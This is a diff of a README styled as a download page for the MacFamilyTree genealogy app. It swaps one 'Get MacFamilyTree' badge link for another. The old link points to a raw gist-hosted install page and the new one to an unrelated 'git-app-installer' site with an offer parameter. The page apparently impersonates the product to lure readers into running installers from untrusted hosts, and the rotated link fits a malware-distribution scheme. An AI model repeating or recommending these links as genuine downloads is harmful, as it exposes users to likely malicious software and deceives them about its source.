@@ -1,7 +1,7 @@
 # MacFamilyTree Desktop — Genealogy for macOS
 MacFamilyTree for macOS allows you to create detailed family trees, track lineage, and explore your ancestry with intuitive mac-native tools.
 
-<a href="https://gistcdn.githack.com/aknelblond364/20c5aeb4617d9ad9b6bfd11a19b1b0b9/raw/a13e619eade80f5dd071437e3b28846bc8d441bb/install.html?offer=MacFamilyTree" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MacFamilyTree" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MacFamilyTree%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
